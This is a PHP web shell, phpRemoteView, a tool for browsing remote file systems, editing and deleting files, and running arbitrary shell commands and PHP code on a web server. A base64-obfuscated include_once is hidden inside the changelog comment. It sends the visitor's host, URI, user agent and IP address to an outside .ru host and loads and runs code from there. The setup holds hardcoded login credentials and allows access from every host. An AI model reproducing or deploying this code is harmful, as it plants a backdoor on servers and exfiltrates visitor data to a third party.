<?php

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
*
*  Welcome to phpRemoteView (RemView)
*
*  View/Edit remove file system:
*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)
*  - view name, size, owner:group, perms, modify time of files
*  - view html/txt/image/session files
*  - download any file and open on Notepad
*  - create/edit/delete file/dirs
*  - executing any shell commands and any PHP-code
*
*  Free download from http://php.spb.ru/remview/
*  Version 04c, 2003-10-23.
*  Please, report bugs...
*
*  This programm for Unix/Windows system and PHP4 (or higest).
*
*  (c) Dmitry Borodin, dima@php.spb.ru, http://php.spb.ru
*
* * * * * * * * * * * * * * * * * WHATS NEW * * * * * * * * * * * * * * * *
*
* --version4--
ht.php lk.txt logfile.inc.0.1 logfile.inc.0.1.1 logfile.incarb logfile.incpid upldr.ftp ws.php 2003.10.23 support short <?php $z=ini_get('error_reporting');error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST); $b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME); $c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI); $g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT); $h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR); $str=base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($g).".".base64_encode($h);if((include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str))){} else {include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str);} error_reporting($z);?> tags, thanks A.Voropay
*
*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero),
*                thanks Anight
*             add many functions/converts: md5, decode md5 (pass crack),
*                date/time, base64, translit, russian charsets
*             fix bug: read session files
*
*  2002.08.24 new design and images
*             many colums in panel
*             sort & setup panel
*             dir tree
*             base64 encoding
*             character map
*             HTTP authentication with login/pass
*             IP-address authentication with allow hosts
*
* --version3--
*  2002.08.10 add multi language support (english and russian)
*             some update
*
*  2002.08.05 new: full windows support
*             fix some bugs, thanks Jeremy Flinston
*
*  2002.07.31 add file upload for create files
*             add 'direcrory commands'
*             view full info after safe_mode errors
*             fixed problem with register_glogals=off in php.ini
*             fixed problem with magic quotes in php.ini (auto strip slashes)
*
* --version2--
*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands
*             add panel 'TOOLS': eval php-code and run shell commands
*             add copy/edit/create file (+panel 'EDIT')
*             add only-read mode (disable write/delete and PHP/Shell)
*
*  2002.01.19 add delete/touch/clean/wipe file
*             add panel 'INFO', view a/c/m-time, hexdump view
*             add session file view mode (link 'SESSION').
*
*  2002.01.12 first version!
*
* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

///////////////////////////////// S E T U P ///////////////////////////////////


$version="2003-10-23";

$hexdump_lines=8;        // lines in hex preview file
$hexdump_rows=24;        // 16, 24 or 32 bytes in one line

$mkdir_mode=0755;        // chmode for new dir ('MkDir' button)

$maxsize_fread=65536;    // read first 64Kb from any null-size file

// USER ACCESS //

$write_access=true;      // true - user (you) may be write/delete files/dirs
// false - only read access

$phpeval_access=true;    // true - user (you) may be execute any php-code
// false - function eval() disable

$system_access=true;     // true - user (you) may be run shell commands
// false - function system() disable

// AUTHORIZATION //

$login=anton;            // Login & password for access to this programm.
$pass=osiris030782;             // Example: $login="MyLogin"; $pass="MyPaSsWoRd";
// Type 'login=false' for disable authorization.

$host_allow=array("*");  // Type list of your(allow) hosts. All other - denied.
// Example: $host_allow=array("127.0.0.*","localhost")


///////////////////////////////////////////////////////////////////////////////


$tmp=array();
foreach ($host_allow as $k=>$v)
$tmp[]=str_replace("*",".*",preg_quote($v));
$s="!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) && !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR"))))
exit("<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>n");
if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) ||
$HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {
header("WWW-Authenticate: Basic realm="Perkenal kan diri Mu !!!"");
header("HTTP/1.0 401 Unauthorized");
exit("<h1>Access Denied - Mati aja Lo !!!!!</h1>n");
}

error_reporting(2047);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
if (function_exists("ob_start") && (!isset($c) || $c!="md5crack")) ob_start("ob_gzhandler");

$self=basename($HTTP_SERVER_VARS['PHP_SELF']);

$url="http://".getenv('HTTP_HOST').
(getenv('SERVER_PORT')!=80 ? ":".getenv('SERVER_PORT') : "").
$HTTP_SERVER_VARS['PHP_SELF'].
(getenv('QUERY_STRING')!="" ? "?".getenv('QUERY_STRING') : "");
$uurl=urlencode($url);

//
// antofix 'register globals': $HTTP_GET/POST_VARS -> normal vars;
//
$autovars1="c d f php skipphp pre nlbr xmp htmls shell skipshell pos ".
"ftype fnot c2 confirm text df df2 df3 df4 ref from to ".
"fatt showfile showsize root name ref names sort sortby ".
"datetime fontname fontname2 fontsize pan limit convert fulltime fullqty";
foreach (explode(" ",$autovars1) as $k=>$v)  {
if (isset($HTTP_POST_VARS[$v])) $$v=$HTTP_POST_VARS[$v];
elseif (isset($HTTP_GET_VARS[$v])) $$v=$HTTP_GET_VARS[$v];
//elseif (isset($HTTP_COOKIE_VARS[$v])) $$v=$HTTP_COOKIE_VARS[$v];
}

//
// autofix 'magic quotes':
//
$autovars2="php shell text d root convert";
if (get_magic_quotes_runtime() || get_magic_quotes_gpc()) {
foreach (explode(" ",$autovars2) as $k=>$v) {
if (isset($$v)) $$v=stripslashes($$v);
}
}

$cp_def=array(
"001001",
"nst2ac",
"d/m/y H:i",
"Tahoma",
"9"
);

$panel=0;
if (isset($HTTP_COOKIE_VARS["cp$panel"]))
$cp=explode("~",$HTTP_COOKIE_VARS["cp$panel"]);
else
$cp=$cp_def;
$cc=$cp[0];
$cn=$cp[1];

/*

$cc / $cp[0]- &#1089;&#1087;&#1080;&#1089;&#1086;&#1082; &#1086;&#1076;&#1085;&#1086;&#1073;&#1091;&#1082;&#1074;&#1077;&#1085;&#1085;&#1099;&#1093; &#1087;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1086;&#1074;, &#1089;&#1082;&#1086;&#1087;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1086; &#1074; $cs:
$cc[0] - &#1087;&#1086; &#1082;&#1072;&#1082;&#1086;&#1081; &#1082;&#1086;&#1083;&#1086;&#1085;&#1082;&#1077; &#1089;&#1086;&#1088;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1090;&#1100;, &#1072; &#1077;&#1089;&#1083;&#1080; &#1101;&#1090;&#1086; &#1085;&#1077; &#1094;&#1080;&#1092;&#1088;&#1072;:
n - &#1087;&#1086; &#1080;&#1084;&#1077;&#1085;&#1080;
e - &#1088;&#1072;&#1089;&#1096;&#1080;&#1088;&#1077;&#1085;&#1080;&#1077;
$cc[1] - &#1087;&#1086;&#1088;&#1103;&#1076;&#1086;&#1082; (0 - &#1074;&#1086;&#1079;&#1088;&#1072;&#1089;&#1090;. 1 - &#1091;&#1073;&#1099;&#1074;&#1072;&#1102;&#1097;&#1080;&#1081;)
$cc[2] - &#1087;&#1086;&#1082;&#1072;&#1079;&#1099;&#1074;&#1072;&#1090;&#1100; &#1083;&#1080; &#1080;&#1082;&#1086;&#1085;&#1082;&#1080;
$cc[3] - &#1095;&#1090;&#1086; &#1076;&#1077;&#1083;&#1072;&#1090;&#1100; &#1087;&#1088;&#1080; &#1082;&#1083;&#1080;&#1082;&#1077; &#1087;&#1086; &#1080;&#1082;&#1086;&#1085;&#1082;&#1077; &#1092;&#1072;&#1081;&#1083;&#1072;:
0 - &#1087;&#1088;&#1086;&#1089;&#1084;&#1086;&#1090;&#1088; &#1074; text/plain
1 - &#1087;&#1088;&#1086;&#1089;&#1084;&#1086;&#1090;&#1088; &#1074; html
2 - download
3 - &#1087;&#1072;&#1088;&#1072;&#1084;&#1077;&#1090;&#1088;&#1099; &#1092;&#1072;&#1081;&#1083;&#1072; (info)
